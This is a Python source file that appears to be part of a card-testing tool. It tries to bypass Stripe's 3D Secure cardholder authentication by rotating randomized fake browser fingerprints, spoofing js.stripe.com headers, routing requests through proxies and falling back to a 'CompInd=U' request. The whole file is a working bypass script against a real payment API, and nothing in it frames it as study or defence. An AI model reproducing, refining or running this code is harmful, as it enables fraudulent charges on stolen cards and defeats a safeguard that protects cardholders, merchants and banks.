import random
import json
import asyncio
import logging
from urllib.parse import quote

logger = logging.getLogger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
]

SCREEN_RESOLUTIONS = [(1920, 1080), (1366, 768), (1536, 864), (1440, 900), (2560, 1440)]
COLOR_DEPTHS = [24, 24, 24, 30, 32]

def generate_browser_profile():
    width, height = random.choice(SCREEN_RESOLUTIONS)
    color_depth = random.choice(COLOR_DEPTHS)
    ua = random.choice(USER_AGENTS)
    tz = random.choice(["-300", "-480", "-420", "0", "60"])
    
    return {
        "fingerprintAttempted": True,
        "fingerprintData": None,
        "challengeWindowSize": None,
        "threeDSCompInd": "Y",
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": "en-US",
        "browserColorDepth": str(color_depth),
        "browserScreenHeight": str(height),
        "browserScreenWidth": str(width),
        "browserTZ": tz,
        "browserUserAgent": ua
    }

BYPASS_PROFILES = [generate_browser_profile() for _ in range(20)]

HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

async def try_3ds_bypass(session, source: str, pk: str, proxy: str = None) -> dict:
    """Try 3DS bypass with profile rotation"""
    
    # Strategy 1: Profile rotation (try 10 profiles)
    for i in range(10):
        profile = BYPASS_PROFILES[i]
        browser_json = json.dumps(profile)
        
        auth_body = f"source={source}&browser={quote(browser_json)}"
        auth_body += "&one_click_authn_device_support[hosted]=false"
        auth_body += "&one_click_authn_device_support[same_origin_frame]=false"
        auth_body += "&one_click_authn_device_support[spc_eligible]=true"
        auth_body += "&one_click_authn_device_support[webauthn_eligible]=true"
        auth_body += "&one_click_authn_device_support[publickey_credentials_get_allowed]=true"
        auth_body += f"&key={pk}"
        
        try:
            async with session.post(
                "https://api.stripe.com/v1/3ds2/authenticate",
                headers=HEADERS,
                data=auth_body,
                proxy=proxy
            ) as r:
                auth_result = await r.json()
            
            if "error" in auth_result:
                break
            
            state = auth_result.get("state", "")
            ares = auth_result.get("ares")
            
            if state == "succeeded":
                return {"success": True, "method": "profile_rotation"}
            
            if ares and isinstance(ares, dict):
                trans_status = ares.get("transStatus", "")
                if trans_status in ("Y", "A", "I"):
                    return {"success": True, "method": "profile_rotation"}
                elif trans_status in ("N", "R"):
                    return {"success": False, "error": "Bank rejected"}
                elif trans_status == "C" or state == "challenge_required":
                    if i < 9:
                        await asyncio.sleep(0.2)
                        continue
                    break
        except Exception as e:
            logger.error(f"3DS auth error: {e}")
            if i < 9:
                continue
            break
    
    # Strategy 2: CompInd=U
    browser_unavailable = {
        "fingerprintAttempted": False,
        "fingerprintData": None,
        "threeDSCompInd": "U",
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": "en-US",
        "browserColorDepth": "24",
        "browserScreenHeight": "1080",
        "browserScreenWidth": "1920",
        "browserTZ": "-300",
        "browserUserAgent": USER_AGENTS[0]
    }
    
    auth_body = f"source={source}&browser={quote(json.dumps(browser_unavailable))}"
    auth_body += "&one_click_authn_device_support[hosted]=false"
    auth_body += "&one_click_authn_device_support[spc_eligible]=false"
    auth_body += f"&key={pk}"
    
    try:
        async with session.post(
            "https://api.stripe.com/v1/3ds2/authenticate",
            headers=HEADERS,
            data=auth_body
        ) as r:
            auth_result = await r.json()
        
        if "error" not in auth_result:
            state = auth_result.get("state", "")
            ares = auth_result.get("ares")
            
            if state == "succeeded":
                return {"success": True, "method": "compind_u"}
            
            if ares and isinstance(ares, dict):
                trans_status = ares.get("transStatus", "")
                if trans_status in ("Y", "A", "I"):
                    return {"success": True, "method": "compind_u"}
    except Exception as e:
        logger.error(f"CompInd=U error: {e}")
    
    return {"success": False, "error": "All strategies failed"}
